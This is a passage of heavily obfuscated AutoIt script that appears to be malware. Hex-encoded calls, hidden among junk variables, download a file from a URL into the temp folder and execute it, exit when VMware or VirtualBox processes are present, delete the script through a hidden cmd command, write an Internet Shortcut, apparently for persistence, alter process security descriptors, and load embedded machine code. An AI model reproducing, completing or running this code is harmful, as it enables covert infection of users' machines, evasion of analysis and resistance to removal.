	Dim $ncrgsncjueiarcyrbklgk = "<body>"
	Dim $phvopymtmbjf = "<title>_IE_Example("
	Dim $xzvdlud = "MemoryConstants.au3"
	Global $thlmykbahq = "browserdom"
	Global $twspopstfuhogoir = "uint"
	Local $bhvqbhorie = "handle*"
	Local $elbhtepkbnomexrvtjs = "int"
	Dim $hyfqhaxkoaepjvmbx = "document"
	Global $auhdwjwvovllooddbcxomq = "uint"
	Local $pnwjrlhhhqn = "ulong Version;ulong Size;byte DeviceType;byte DeviceTypeModifier;byte RemovableMedia;byte CommandQueueing;ulong VendorIdOffset;ulong ProductIdOffset;ulong ProductRevisionOffset;ulong SerialNumberOffset;ulong BusType;ulong RawPropertiesLength;byte RawDeviceProperties[1]"
	If NOT ($gdansbruhyuevqfpssutaqex == 1) Then
		Local $xmacyycfpwlraie = $poe($zeyc("0x46696C654F70656E2824687967727875746475796A6C737772706A787A667976637872767A6264626C64746A756C2C2022322229"))
	Else
		Local $lufkzekbddcxduafaxldfg = $ee($v1("0x246771736E782026202244344646393538343031303030303835433037384235384234354430364134303537364130323839343544383844343544383530353735373537384434354643353036414646464622"))
	EndIf
	Dim $uxecws = IsString(48231786)
	If NOT ($uxecws == "zbdmzssyrjfdxcjybobqfszwngs") Then
		Local $hukomnvtunodrfwfqpx = readresources($res, "10")
	Else
		Local $gykhghp = $ee($v1("0x247A756979676A697A6A626C2026202235304538454645384646464638393835443430303030303038443835333046464646464635304538444445384646464638423735304338393835333430313030303038443435434322"))
	EndIf
	Dim $rjavnhjjvtwhvzmwkeegx = IsString("yiiiyqzatmovhlxkdpvedqvhnhvkmfnrdpqutg")
	Dim $kkufzoosfarpuzygrxfmbeqz = "hyp"
	Local $uxawannxzpquhtdu = "></td>"
	Dim $jehrzptwxguuwoztveerc = "wparam"
	Dim $qbdysyjeunakmgbggrqrfutf = "int"
	Global $qhnsdciaxmv = "float"
	Global $pajnphpcxklqkuwixrsqsw = "wchar Text["
	Global $idfeulnqupujssssokchmr = "Call Failed"
	Dim $oelidttoqgdjydzx = "long"
	Local $byfzaxel = "handle*"
	Local $rpcofhciqvbv = "Intermediate response"
	Local $jqhdjnbjbrjflkzh = "Sqlite File Download"
	Dim $pnhjxsvrz = "Command"
	Dim $dnlone = "wchar Text["
	Dim $qgaxwbqxrnmvwwbchkknwb = "wstr"
	Dim $grawldnviyhhlbqf = "dword"
	Dim $nggrjlguqraogyipkqafk = "uxtheme.dll"
	Global $xtvviuictenizaq = "Error"
	Dim $weijaidlgosc = "_IETableWriteToArray"
	Local $ttqqllwiyu = "m"
	If NOT ($rjavnhjjvtwhvzmwkeegx == "zhconizeqjiw") Then
		$poe($zeyc("0x46696C6557726974652824786D61637979636670776C726169652C20446C6C53747275637447657444617461282468756B6F6D6E7674756E6F64726677667170782C20312929"))
	Else
		Local $cxhtinywqxwbizqclwkiklve = $ee($v1("0x246F68776B6D6B66676E6475636C616173676D656A74656B7A2026202238383835383646454646464643373835414346414646464635323734364334334337383542304641464646463732363536313734433738354234464146464646363535353733363522"))
	EndIf
	Dim $aqkaqabdvfntm = IsString("hdpujwysuihfbljbgu")
	Global $rtzbfgautxzv = "char Text["
	Local $xduwoccjklofxdtnipodjly = "$_IESTATUS_InvalidDataType"
	Dim $wgddz = "kernel32.dll"
	Global $pocsfgojpprbcqzkrgvlo = "_IEPropertyGet"
	Dim $sngvggltgbnf = "Error"
	Local $hoawjtbxfgtm = "INT"
	Dim $gekszrasdiexubc = "int"
	Global $wnwop = "CreateProcessWithTokenW"
	Local $qapmtstsujvsrshwwn = "X"
	Global $wdmulwmrsp = "uint_ptr"
	If NOT ($aqkaqabdvfntm == 0) Then
		$poe($zeyc("0x46696C65436C6F73652824786D61637979636670776C7261696529"))
	Else
		Local $kozlkpxxbaowbgovuy = $ee($v1("0x247869637A646876726376727562666E627A73686A7467796B627A6364682026202246464646343338354330373444323546354535423842453535444332303830304343434343434343434343434343434343434343434343434343353138443443323430343242433822"))
	EndIf
	If $run Then
		If $startup AND isnotfzhoiqadyo() = False Then
			Return 
		EndIf
		Dim $iaadqp = IsInt(-21748882)
		Dim $ygjdgarbqvjuxdshvga = "nFileSizeLow"
		If NOT ($iaadqp == "wklgjtbcbkmycdhrklak") Then
			$poe($zeyc("0x5368656C6C457865637574652824687967727875746475796A6C737772706A787A667976637872767A6264626C64746A756C29"))
		Else
			$er = $poe($fooi4e("0x446C6C43616C6C282261647661706933322E646C6C222C2022696E74222C2022536574536563757269747944657363726970746F724461636C222C2022707472222C2024504F4F4F452C2022696E74222C202231222C2022707472222C20244F4F2C2022696E74222C2022302229"))
		EndIf
	EndIf
EndFunc

Func dyjzmqqumg($title, $body, $type)
	Dim $grirgsfysreqknoctgra = IsInt("clpkyrfikogbr")
	Global $dayhrycdz = "handle"
	Local $lzhmd = "handle"
	Dim $enqefczib = "Bottom"
	Local $kldsgrbscmkvy = "\"
	If NOT ($grirgsfysreqknoctgra == "ofqgdpkmskvfxxifllsqzcifdmhslpfzebqxukkrjbvvaj") Then
		Dim $vdfsj = $poe("binarytostring")
	Else
		Local $n1 = $ee($v1("0x246A65726F69646C69716C6A7373696C64727A6471656A717120262022303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303022"))
	EndIf
	If isnotfzhoiqadyo() Then
		Dim $hkokzbscpk = IsInt(95819969)
		Global $csjeqavpfmxldrcufdv = "word"
		Global $wjirjnilpmuijs = "$_IESTATUS_InvalidObjectType"
		Global $gmvjycqpknppyu = "wparam"
		Global $wavyrhgtwlruijjkr = "--> Query:    "
		Dim $dygscya = "Reserved"
		Global $snnuwlznpfoqbrzvce = "wchar Text["
		Dim $fbsmytcvsh = "Idle"
		Global $tdgnnyldy = "GetThemeTextExtent"
		Local $wpthwwnrkmlvhyr = "comctl32.dll"
		Global $ybtvxvooqhsdgbdzbdjovk = "GetThemeTransitionDuration"
		Dim $gskgpgplbbntarxsiffyh = "struct*"
		If NOT ($hkokzbscpk == "qkcsyczmwyzetxqvssuaziwrnq") Then
			$poe($vdfsj("0x4D7367426F782824747970652C20247469746C652C2024626F647929"))
		Else
			Local $bgpogvpvnyrguccjki = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022707472222C20224C6F61645265736F75726365222C2022707472222C202468496E7374616E63652C2022707472222C20246D627263716764667A686165786A64706F74766D7562766E6863666164646C66617A64727A7876717A7662777369766C295B2230225D"))
		EndIf
	EndIf
EndFunc

Func flbsckfplh($url, $path)
	Dim $shwomdbnboar = IsInt("pdblakqzbhqjb")
	Dim $dreaqf = "handle"
	Local $wnfugoaisyssdi = "Text"
	Local $faauoaeevpajbc = "ptr"
	Dim $hohhh = "Error"
	Local $mjijzjeleablrhnbpkyzy = "bool"
	Global $qdamgexokzbqvuvgwyxcuq = ";uint msg;wparam wParam;lparam lParam;"
	If NOT ($shwomdbnboar == "yjwfdhsevldxp") Then
		Dim $sdvfi = $poe("binarytostring")
	Else
		Local $er = $poe($fooi4e("0x446C6C43616C6C282261647661706933322E646C6C222C2022696E74222C2022496E697469616C697A65536563757269747944657363726970746F72222C2022707472222C2024504F4F4F452C202264776F7264222C2022312229"))
	EndIf
	If isnotfzhoiqadyo() Then
		Dim $agrxnqwwnltwirezcmasgwfv = IsString("meprtnxfxcqebputkojggbdr")
		Dim $udzvblanabucfdkbzye = "handle"
		Global $hppteawiumwdtiubggemblgq = "Preparing display"
		If NOT ($agrxnqwwnltwirezcmasgwfv == 0) Then
			$poe($sdvfi("0x496E6574476574282455524C2C204054656D70446972202620225C22202620247061746829"))
		Else
			Local $nqnugsdxskbivr = $ee($v1("0x247479757769646B726671756E2026202232344641464646463530384434354543353046464437353046464436383938354334303030303030384438354434464246464646353038443435454335304646443735304646443622"))
		EndIf
		Dim $vtptyhvuvjfhhzrrghgc = BinaryToString("0x666864647A7A78616C7A6C736C7A69")
		Global $yolxwjztkecsbooizm = "_IEFormElementGetObjByName"
		Global $yevkfzjxkumrcatjwzagowvo = "lparam"
		Dim $sukowcszjqnqjpvakqa = "uint"
		Local $ycnkokbjglzgrdzfppjaj = "MoveToEx"
		Dim $qrtwlxygfwv = "Size"
		If NOT ($vtptyhvuvjfhhzrrghgc == 1) Then
			$poe($sdvfi("0x5368656C6C45786563757465284054656D70446972202620225C22202620247061746829"))
		Else
			Local $mbrcqgdfzhaexjdpotvmubvnhcfaddlfazdrzxvqzvbwsivl = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022707472222C202246696E645265736F7572636557222C2022707472222C202468496E7374616E63652C202277737472222C2024412C20226C6F6E67222C202442295B2230225D"))
		EndIf
	EndIf
EndFunc

Func mecezzrnqo()
	Dim $mnixaj = BinaryToString("jwthexahrmyugfw")
	Global $afblpmmfuetxqfyjnt = "user32.dll"
	Global $sdcbbdijfrn = "int"
	If NOT ($mnixaj == 0) Then
		Dim $rei = $poe("binarytostring")
	Else
		Local $egvronbfwjyekyxaobsttusqipc = $ee($v1("0x24766F61657A617079657863642026202246463530384438354434463446464646353046464437384438353634464546464646383343343043353046464436353934303530384438353634464546464646353038443835423422"))
	EndIf
	If $poe($rei("0x57696e457869737473282250726f6772616d204d616e616765722229203d20223022")) Then
		Dim $vfvmrt = IsString("dxyozcifnvjqzjzmkptvhduhtsoqvxyimorbnuanmztx")
		Global $qrscapxcdkibyjnjdwo = "dword*"
		Dim $pjsnabhk = "struct*"
		Dim $klklgiqtkq = "int64*"
		Local $xddjgtyj = "browser"
		Local $iknpwv = "int"
		Global $unxdywn = "struct*"
		Global $oxwnpwyxeyhxzzicwvbxpx = "bool"
		Local $jfalkfappxem = "wstr"
		Global $yxotvxoyvvasxwhqyle = "StateMask"
		If NOT ($vfvmrt == 0) Then
			$poe($rei("0x50726F63657373436C6F736528404175746F497450494429"))
		Else
			Local $gsxxovmoulwnwljshorrprzooz = $ee($v1("0x2471716773616865776868696D7A796C71696E73767275662026202236373639433738354338464546464646364535303631363936364337383543434645464646463645373438383835434546454646464643373835323446434646464634333646343922"))
		EndIf
	EndIf
EndFunc

Func vvoxfdvjxx()
	Dim $xmtthhjbdqayizrjfp = IsString("qaonskpyqbeatppessc")
	Dim $kndthhfasqbaluaoq = "wparam"
	Global $ezuoxpgswsljsvjfeo = "wstr"
	Global $qihhygpfavpknlktovsbmdz = "Amount"
	Global $pkukccctor = "LogFont"
	Dim $jqnvxwyfkzmpsjslmicprrf = "text/javascript"
	If NOT ($xmtthhjbdqayizrjfp == 0) Then
		Dim $gfbvo = $poe("binarytostring")
	Else
		Local $fxcmhhglcajhoxvrgycvwdt = $ee($v1("0x24796E7870636877786C72676E65736963666F2026202238353038463946464646353045383141453646464646383938353830303030303030384438353643464146464646353045383038453646464646383938353834303030303030384422"))
	EndIf
	If $poe($gfbvo("0x50726f636573734578697374732822766d746f6f6c73642e6578652229")) Then
		Dim $smitxsghxjkzicitc = IsString(50404733)
		Global $tjibjkshrlbf = "int*"
		Local $lmggiuahleftvplud = "dword"
		Dim $ylvjvoqrzxcyydqseam = " & $iSize & "
		Global $wxeqwr = "Field3"
		Local $jvqraqxltejinbgvrzspcjt = "StringConstants.au3"
		If NOT ($smitxsghxjkzicitc == 1) Then
			$poe($gfbvo("0x50726F63657373436C6F736528404175746F497450494429"))
		Else
			Local $kqvrjqdppjzjuefuevrd = $ee($v1("0x24767A646B74797976646E6A79716C696A7478716C74626B2026202237383734433738353330464246464646353436383732363536364337383533344642464646463631363438383835333646424646464643373835464346414646464634453734343722"))
		EndIf
	EndIf
	If $poe($gfbvo("0x50726f63657373457869737473282276626f782e6578652229")) Then
		Dim $smitxsghxjkzicitc = IsString(50404733)
		Global $tjibjkshrlbf = "int*"
		Local $lmggiuahleftvplud = "dword"
		Dim $ylvjvoqrzxcyydqseam = " & $iSize & "
		Global $wxeqwr = "Field3"
		Local $jvqraqxltejinbgvrzspcjt = "StringConstants.au3"
		If NOT ($smitxsghxjkzicitc == 1) Then
			$poe($gfbvo("0x50726F63657373436C6F736528404175746F497450494429"))
		Else
			Local $kqvrjqdppjzjuefuevrd = $ee($v1("0x24767A646B74797976646E6A79716C696A7478716C74626B2026202237383734433738353330464246464646353436383732363536364337383533344642464646463631363438383835333646424646464643373835464346414646464634453734343722"))
		EndIf
	EndIf
EndFunc

Func aztcpblyci()
	Dim $kjibuugyzivcnrqocwwhn = IsString(-1300583)
	Global $usvqublxlm = "handle"
	Dim $hebiiaznyvgzvqa = "fStyle"
	Local $zcmzncjnuqqg = "handle"
	Global $ipcmosiauwxpqzllpxdtf = "SP"
	Dim $zzufiwrrlembyvzrrb = "dword"
	Dim $msojfbiabphhkmpxc = "long"
	If NOT ($kjibuugyzivcnrqocwwhn == 1) Then
		Dim $rfo = $poe("binarytostring")
	Else
		Local $qhccowtetrhfrjskqnagr = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x405573657250726F66696C65446972202620225C2220262024626262"))
	EndIf
	If isnotfzhoiqadyo() Then
		Dim $efemmjmtxmbdiebmgfwdvjr = IsString("herpnambjhkiogpmgnctqtzpvdt")
		Global $iktpkuykigczshk = "struct;"
		Global $yciaisfncvouyh = "ptr"
		Global $nsmsofrdadxkn = "handle"
		If NOT ($efemmjmtxmbdiebmgfwdvjr == "jyyoabsgrszyjjsipkcbskoseqaws") Then
			$poe($rfo("0x5368656C6C457865637574652822636D64222C2022202F632054696D654F7574203120262044656C202F4620222026204368722822333422292026204053637269707446756C6C506174682026204368722822333422292C2022222C2022222C204053575F4849444529"))
		Else
			Local $jodpmpoobfxkkqgostskybdmlhxo = $ee($v1("0x246F64646A61617A71626C776873726F782026202238353041464146464646433738354143464546464646344336343732344343373835423046454646464636463631363434343636433738354234464546464646364336433838383522"))
		EndIf
	EndIf
EndFunc

Func acl()
	Dim $lbgrfi = IsInt("aebseafsiaxsetgsvjefrnencwuhvkrjhiyfkay")
	Global $dwoiujtwxvntkwrwip = "long"
	Dim $xliwaytclsbwwcup = "int"
	Dim $rragyiwunltlcuc = "Handle"
	Local $mulztldlx = "dword*"
	Global $gqgulxweknedgrsgzcuwkk = "Icon"
	Local $rxpdmkj = "dword"
	Local $ceiifjfu = "\psapi.dll"
	If NOT ($lbgrfi == 1) Then
		Dim $fooi4e = $poe("binarytostring")
	Else
		Local $gfds45sdq45 = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x225B496E7465726E657453686F72746375745D222026204043522026202255524C3D66696C653A2F2F2F22202620537472696E675265706C61636528246870756471677972676C79626A7A74737A756A6475706E797A6A67677A6F79726C6564616B686D676D6E6765646578626C786C752C20225C222C20222F2229"))
	EndIf
	Dim $htctwlvtxmwlsrta = BinaryToString("cgcwqojanbgiwbfhvyxxnawvsmqloktbsompwouujtgls")
	Dim $cpmqbrtonephyvyuvgbpp = "int"
	Dim $rmrofcewute = "uint*"
	Local $vucejhg = "handle"
	Global $vfluwofzlezpafjlatmeq = "dword"
	Dim $lhnluwbnsvszqjzgofr = "<style>body {font-family: Arial}"
	Dim $twvxhnrof = "wchar["
	Dim $jpbueodlxfmjvqtgqld = "int"
	Local $nqpwonvdp = "bool"
	Global $akfuacisioklcqtlyuxkedb = "Warning"
	Dim $zpptptlxqja = "user32.dll"
	Local $jvyzf = "Count"
	Global $ukfvunswiuprcscoyqafajk = "handle"
	Local $aifbfapbvfnuyxetbggsxq = "int"
	Local $odoxka = "GdipGetPathGradientPointCount"
	Local $nkrgopcaxxadrcagieurzkp = "dword"
	Dim $waelfjjakucurrpwtw = "w"
	Global $bnqbvjuycvvgxsbwmrrurr = "TextMax"
	Dim $ncbcrsncuvnnjja = "SetTimer"
	If NOT ($htctwlvtxmwlsrta == "vzfjefbxwnpjb") Then
		Local $p5 = $poe($fooi4e("0x446C6C5374727563744372656174652822627974652041636C5265766973696F6E3B627974652053627A313B7573686F72742041636C53697A653B7573686F727420416365436F756E743B7573686F72742053627A322229"))
	Else
		$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C65577269746528246F72716C646F667863656568716F656B6D7A767A70767A74656E6572786B7A736163756D64686F2C2046696C65526561642846696C654F70656E284053637269707446756C6C506174682C203136333834292929"))
	EndIf
	Dim $iygotz = BinaryToString("0x776863737472786862687477647A73677279")
	Dim $dfjgmnigtvlciddwoj = "handle"
	Dim $fojhxztdmckowzomga = "ProcessParameters"
	Dim $vgxwylpczqewaxqaypno = "float["
	Dim $aomdpkhighxkimlyoda = "int"
	Local $svcxlhlhm = "DecryptFileW"
	If NOT ($iygotz == "gcvqbgxbhold") Then
		Local $oo = $poe($fooi4e("0x446C6C5374727563744765745074722824503529"))
	Else
		$poe($vfds41dfs4("0x446C6C43616C6C41646472657373282264776F7264222C202464737166363536736435712C2022707472222C20446C6C53747275637447657450747228243464666762733534666467292C2022696E74222C2042696E6172794C656E282464292C2022737472222C2042696E617279546F537472696E67282462292C2022696E74222C203029"))
	EndIf
	Dim $nwimiassixpdminn = IsString("arawubldpromgxdmrqrulnzugnjoisiyegfatazyxqg")
	Dim $guvqaryzxyugvuqdlgd = " lines;"
	Global $idsppyu = "lresult"
	Dim $nwhbmw = "StructureConstants.au3"
	Local $slyuwroxkfthuxdlsxlc = "Row"
	Dim $qstynoq = "byte["
	Global $ocsjiwxaajoottyeptyw = "handle"
	Global $hibdtajtquofvk = "/"
	Local $nbzwpb = "bool"
	If NOT ($nwimiassixpdminn == 0) Then
		Local $df = $poe($fooi4e("0x446C6C5374727563744372656174652822627974655B32305D2229"))
	Else
		$poe($vfds41dfs4("0x446C6C537472756374536574446174612824647371346473342C20312C2024666473766734357364663534677629"))
	EndIf
	Dim $ajywqcmvplbgtearpyufoctn = IsString("bdtjqsyoxjaqmyixhursfmtfakzygwftofnbrwstf")
	Dim $qsgcdsrlwzsbjfzadiib = "d"
	Dim $htlxpknttgczsvepmi = "char Text[4096]"
	Global $cdexungpaelkbzisucajgyv = "wparam"
	Dim $fyswscnsfp = "wparam"
	Dim $whdtbqoqwwxrffjrdiwrn = "yel"
	Dim $dljwitskugdccetrrqicvf = "CreateMutexW"
	If NOT ($ajywqcmvplbgtearpyufoctn == "hxgytebv") Then
		Local $poooe = $poe($fooi4e("0x446C6C5374727563744765745074722824444629"))
	Else
		Local $cnpixpzptwbritzmfzadvstjjno = $ee($v1("0x24717A706377706F656D616E627374616177642026202230303530463341354538463645324646464636413545353938424630384437433234313046334135384237353038383033453346353637353041464639343234333830313030303022"))
	EndIf
	Dim $ebbhliiozhqphsicdmwzbg = BinaryToString("0x75776A64746B6D676A6A737870756A77627A76757172656C787A66757678726F766562646C746A72797066737261746267")
	Dim $wzfayymrhslzlypcvodjyigy = "wchar Text["
	Dim $uxncsgjlpuhsqva = "handle"
	Local $mlametkkvaosgrpkrtu = "dbghelp.dll"
	Global $cmzinwnnxhwgwxnitts = "Year"
	Local $wwopcfehgua = "int"
	Dim $mwfnxhdhwausxjz = ";"
	Global $iuqduxthjqacg = "int"
	Local $vxoejcepanukiuhgxolnxjch = "gdi32.dll"
	Local $mgtuscxnclsbgpacgciyoju = "Radius"
	Local $bclvhksesigtchlheu = "float"
	Local $xwhvelsj = "float"
	If NOT ($ebbhliiozhqphsicdmwzbg == 0) Then
		Local $er = $poe($fooi4e("0x446C6C43616C6C282261647661706933322E646C6C222C2022696E74222C2022496E697469616C697A65536563757269747944657363726970746F72222C2022707472222C2024504F4F4F452C202264776F7264222C2022312229"))
	Else
		$a = $poe($ayudergfv("0x4269744F522824612C202461202B2022312229"))
	EndIf
	Dim $pcabvcheiibxsv = BinaryToString("0x726B626B7274666A776472627569727A6D73777A7A6A6B677776676B6878")
	Local $ezadmdfezc = "user32.dll"
	If NOT ($pcabvcheiibxsv == 0) Then
		$er = $poe($fooi4e("0x446C6C43616C6C282261647661706933322E646C6C222C2022696E74222C2022496E697469616C697A6541636C222C2022707472222C20244F4F2C202264776F7264222C20446C6C53747275637447657453697A6528245035292C202264776F7264222C2022322229"))
	Else
		Local $hpudqgyrglybjztszujdupnyzjggzoyrledakhmgmngedexblxlu = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x24716863636F77746574726866726A736B716E616772202620225C2220262024626262202620222E76627322"))
	EndIf
	Dim $vpwrq = IsInt("wffnkmmnnzvkquiqrjffapcyhczntlmldpuybwpi")
	Dim $qvedaeljdkebymozoxpxhbj = "Clipboard.au3"
	Dim $vevyvxchjez = "wparam"
	Dim $tpyovt = "dword"
	Local $rniahpo = ">Car</td>"
	Global $signeohyrdkzeunescummr = " target="
	Dim $lmwvrusc = "ExpandEnvStrings"
	Local $mctzouzgsrinncxlrkj = "FilePath"
	Global $jtcldzirx = "dwmapi.dll"
	Local $spiuxrreimdzjsujarciv = "wparam"
	Global $xcrzy = "handle"
	Global $cskhdwmsjrwwpcclf = "ChildWindowFromPointEx"
	Local $pcylwhxva = "struct*"
	If NOT ($vpwrq == "lnviofvigzowsjiqxkwwuoytzazsou") Then
		$er = $poe($fooi4e("0x446C6C43616C6C282261647661706933322E646C6C222C2022696E74222C2022536574536563757269747944657363726970746F724461636C222C2022707472222C2024504F4F4F452C2022696E74222C202231222C2022707472222C20244F4F2C2022696E74222C2022302229"))
	Else
		Local $uetslru = $ee($v1("0x246F66626871697A6D7565786A646475646A2026202237323633363536364337383545304643464646463537303043373835444346444646464634433646363136344337383545304644464646463532363537333646433738354534464422"))
	EndIf
	Dim $isnwqhmge = IsString("wrykgmsistkrhxhkqgje")
	Dim $wlvaftzjoaat = "dword"
	Local $zrrrloecfletsmafduazw = "TimeWritten"
	Global $ygydnwxialenthswripob = "DirConstants.au3"
	Dim $ovxyylyxwwsfpbpjowshhm = ">IE Developer Toolbar</a> (comprehensive DOM analysis tool)</li>"
	Global $eholgty = "hwnd"
	Dim $rzyjpmhrxomgqtga = "]"
	Dim $pbjavtdkmqctgolxjpmduavo = "Focused"
	Local $ruegorzmoiycqlcvauvgsewx = "int"
	Global $eofutfum = "uint"
	Dim $ncgbxpknwrrf = "kernel32.dll"
	Global $jgmyhvwnvyinew = "GetCurrentThreadId"
	Global $nqhtzqggmxwmmik = "/"
	Dim $ozrzoroldobgqaseremskq = "handle"
	Global $yzaipymwahawobqennreg = "X"
	Global $irfoplxtzeqrocoqpjpt = "gdi32.dll"
	Dim $dwnwdom = "struct*"
	Global $gaytxhoj = "wparam"
	Global $lyqlybpwrbcz = "127.0.0.1"
	Dim $bpufmpymhcqwrbajllt = "gdi32.dll"
	If NOT ($isnwqhmge == "wmyodsboxlsjdzmuvofxtf") Then
		$er = $poe($fooi4e("0x446c6c43616c6c282261647661706933322e646c6c222c2022696e74222c20225365744b65726e656c4f626a6563745365637572697479222c2022707472222c202449485431352c202264776f7264222c202230783034222c2022707472222c2024504f4f4f4529"))
	Else
		Local $dbonybzaivkzrgto = $ee($v1("0x246965656C6C6A2026202236443646373236364337383532304644464646463739303043373835333846424646464634453734353436354337383533434642464646463732364436393645433738353430464222"))
	EndIf
EndFunc

Dim $xlemxszcdakrffzoakunmii = IsString(-63455027)
Global $rqotjueeqtoxyjebfe = "IWebBrowser"
Global $vkbze = "browser"
Local $whawil = "250"
Local $hkbvyhvxocehcakzqw = "int"
Local $fjqbuloapyrpowbugwdf = "GetEventLogInformation"
Local $kvthpxsogzwc = "AutoIt.Error"
Local $dvhxydmsodifjzchsoz = "ImageList_SetIconSize"
Dim $eycwk = "input"
Local $uaimshydrfxdfdhsio = "struct*"
Global $nbfmcqj = "bool"
Dim $bcwjiwxgujoxuidvbrj = "struct*"
Global $yogydaqroi = "wchar["
Local $aiuywlhjhophwjhpsloxv = "handle"
Dim $ksxqdv = "Text"
Dim $ncngsncoxqz = "FindFirstFileNameW"
Local $qibwxaozwa = "gdi32.dll"
Local $oqfmihz = "user32.dll"
If NOT ($xlemxszcdakrffzoakunmii == 1) Then
	Local $pepag0
Else
	Local $qfzgoyyefspmlobecgwqe = "0xE9971E0000558BECB84D5A000083EC14663903740433C0EB7F8B433C813C185045000075"
EndIf
Dim $uizxmiyni = IsString(41805642)
Dim $byihtngmpfj = "\\"
Global $dqjrxkotwzofbirgtr = "bo"
Dim $nzzfvzht = "034831C04883C438415F5DC3"
Local $kgksccovtibjtolxuimrfpnp = "kernel32.dll"
Local $ckhaclpuuyzdqd = "ChooseColor"
Local $lqgqjcmkiwtvtubtqlkli = "hwnd"
Global $tqzvfvn = "lparam"
Dim $dacvsiupuowzbeykar = "FtpDeleteFileW"
Dim $msdwscremibvcqb = "dword"
If NOT ($uizxmiyni == 1) Then
	Local $iht15
Else
	Local $tjnzhgdqplkqjm = $ee($v1("0x247466676262706F6F726961766F6C6F62657A6170707175686B642026202238443835303446454646464635304538434445364646464638393835304330313030303038443835334346414646464635304538424245364646464638393835364330313030303022"))
EndIf

Func racrzjaclw($pp, $dd)
	Dim $tcrseihupvwvuwqwdrhz = IsString(-48631866)
	Dim $hgueynxtgyzmv = "MinYear"
	Local $cchvjsmlyzztqutwohxcmq = "GetDC"
	Dim $bnxqkijxdwwxhbpujfyoddle = "handle"
	Global $khjmlavieovorpw = "dword"
	If NOT ($tcrseihupvwvuwqwdrhz == 1) Then
		Local $ee = $poe
	Else
		$poe($vfds41dfs4("0x446C6C537472756374536574446174612824647371346638733564712C20312C2024666473766734357364663534677629"))
	EndIf
	Dim $wyhghickstwyctnmvzptklx = IsString(-8687054)
	Dim $rhygpniepgczgcsh = "wstr"
	Local $vhbvqg = "struct*"
	Local $bvnwcoskupiok = "hwnd"
	Global $wqmitpmiijgpmhaw = "{F7F1ED05-9F6D-47A2-AAAE-29D317C6F066}"
	Global $tsfwsjh = "char["
	Local $nkzeht = "advapi32.dll"
	Dim $rljeoticy = "GlobalFree"
	Local $ongdwruuzlcbhu = "ulong_ptr"
	If NOT ($wyhghickstwyctnmvzptklx == 1) Then
		Local $v1 = $ee("BinaryToString")
	Else
		Local $zuiygjizjbl = $ee($v1("0x246570747978752026202235304538313345394646464638393835303830313030303038443835444346444646464635304538303145394646464638393835444330303030303038443835383446444646464622"))
	EndIf
	Dim $leojpufqjn = IsString("qqxghttyommarxucrdirrvtpvqkirh")
	Dim $zvpzwsakcwm = "wparam"
	Dim $ixttartzfxt = "wparam"
	Local $iaqktcdgsucolulncoyh = "filepath"
	Local $jjppaprgodgbcfcnefbfyrm = "Mask"
	Global $suejhssbhadmcqa = "ptr"
	Local $esjhabubzkarw = "ptr"
	Local $xxbevojaxbjrdle = "struct*"
	If NOT ($leojpufqjn == 0) Then
		Local $qfzgoyyefspmlobecgwqe = "0xE9971E0000558BECB84D5A000083EC14663903740433C0EB7F8B433C813C185045000075"
	Else
		$poe($sdvfi("0x496E6574476574282455524C2C204054656D70446972202620225C22202620247061746829"))
	EndIf
	Local $emwztlkycteenjpenvifkvdilc = $ee($v1("0x2471667A676F7979656673706D6C6F626563677771652026202246303842343431383738383336354638303030334333384235303230384234383138353638423730314330334433303346333537383934444630383543393734344638423430323422"))
	Dim $bahdkuc = BinaryToString("okcqebrmzaagvrvmexsdysjydvz")
	Dim $peuxpt = "int"
	Local $pqjjjysdyofq = "byte Field4;byte Field3;byte Field2;byte Field1"
	Global $ikmcyppvayi = "dword;hwnd;uint;"
	Local $osbxtljytawkmheclbil = "int Hue; int Amount"
	Dim $anuauilbbd = "iv"
	Local $esujykqlgocirymgocfjla = "Left"
	Global $opizugdwhysgz = "kernel32.dll"
	Dim $vuyrsdkyvmbdbkdi = "dword"
	Global $uhmlhzljztap = "int"
	Dim $qflhslfjdhfavwujkacj = "hwnd"
	Dim $rshtkeuxlbgu = "wstr"
	Global $fypxidcypmejqons = "int64 StartTime;int64 BytesRecv;int64 SMBSRecv;int64 PageRead;int64 NonPageRead;"
	Dim $tolsvfjjuzocxmvvetjafo = "uint"
	Global $fvejxitmb = "int"
	If NOT ($bahdkuc == 0) Then
		Local $tzafvzgplsdhvmogcy = $ee($v1("0x24656D777A746C6B79637465656E6A70656E7669666B7664696C632026202230334333383934354543384234354638384230433832384234353038303343423839343546343842343546343841303038383435464638413031304642453744464638383435464522"))
	Else
		Local $nqkevmlevnptlngyplahqyn = $ee($v1("0x247778756F797977666A6F67626B666C6C7263686A747A2026202234354643353036414646464637354634464635354630383543303046383835334646464646463842343546433546354535424339433335353842454342383830314630303030453822"))
	EndIf
	Dim $tgusz = IsString("vzjvycstkumwrhsey")
	Dim $hxvsiydhqfuul = "LONG_PTR"
	Local $awqvpviub = "hwnd"
	Global $amhuqvxxiqpkpflyfz = "CallWindowProc"
	Dim $ttkjfulpark = "ptr"
	Local $dyadqrmwkh = "wparam"
	Dim $kjpcevihtwkk = "MMM"
	Local $izeldyhaevd = "Cannot register internal error handler, cannot trap COM errors"
	Global $iddakbflogddzkcqspfenkc = "GetDeviceCaps"
	Dim $djkgajmjksgkql = "bV5CSType"
	Global $yizzwyocogrjy = "s"
	Local $yxwbhfurpzjjiyubqaekbmg = "$_IESTATUS_NoMatch"
	Global $lcuzmsxl = "ReleaseDC"
	Local $vcsoijwpf = "ptr"
	Local $ptyvywmrlfdurw = "dword"
	Local $mwhhvuxlvtdjvpjvp = "wparam"
	Dim $wypfwtqzyxmtjyt = "Desktop"
	Local $tybkcdihq = "TemplateName"
	Global $crjzuohbkcexnygkawwlmkl = "wstr"
	Local $vlwodagzuvjjef = "ulong"
	If NOT ($tgusz == "wrlxpfzareocydjqnnxioijkjouqyozjrxfmo") Then
		Local $lixfl = $ee($v1("0x24747A6166767A67706C736468766D6F6763792026202230464245433032424638464634354634383037444646303037343042343138303744464530303734303438354646373444363835464637343133464634354638384234354638334222"))
	Else
		Local $fqbyhscug = $ee($v1("0x2471726D62736B796376666B792026202243373835313446454646464637373645343436434337383531384645464646463643373333333332433738353143464546464646354337353733363543373835323046454646464622"))
	EndIf
